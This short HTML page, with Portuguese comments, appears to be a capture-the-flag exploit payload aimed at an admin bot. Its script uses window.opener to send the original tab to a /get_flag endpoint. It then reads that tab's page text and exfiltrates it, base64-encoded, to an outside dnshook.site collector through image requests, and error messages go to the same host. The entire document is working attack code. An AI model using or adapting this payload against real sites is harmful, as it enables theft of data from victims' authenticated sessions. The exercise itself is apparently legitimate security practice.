<!DOCTYPE html>
<html>
  <head>
    <title>Exfiltrating...</title>
  </head>
  <body>
    <h1>Hello Admin :)</h1>

    <script>
      if (window.opener) {
        // Redireciona a aba original com o cookie para obter a flag
        window.opener.location = "http://34.134.162.213:17001/get_flag";

        setTimeout(() => {
          try {
            // Tenta capturar a flag da aba original
            const flag = window.opener.document.body.innerText;

            // Exfiltra usando DNS (sempre funciona)
            const img = new Image();
            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/" + btoa(flag);
          } catch (e) {
            // Em caso de erro, envia o erro para debug
            const img = new Image();
            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/error_" + btoa(e.message);
          }
        }, 2500); // Tempo extra pra garantir que a aba tenha carregado
      }
    </script>
  </body>
</html>
